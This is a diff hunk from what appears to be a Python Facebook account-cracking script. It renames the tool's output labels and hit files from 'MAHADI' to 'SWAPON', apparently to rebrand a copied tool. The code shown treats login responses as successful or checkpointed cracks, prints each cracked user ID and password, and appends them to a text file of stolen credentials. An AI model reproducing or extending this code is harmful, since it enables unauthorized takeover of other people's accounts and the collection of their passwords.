@@ -1279,12 +1279,12 @@ class Main:
 				print("\r \033[0;92m[ SWAPON-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Janu ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MAHADI-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SWAPON-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MAHADI-OK ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ SWAPON-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MAHADI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SWAPON-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
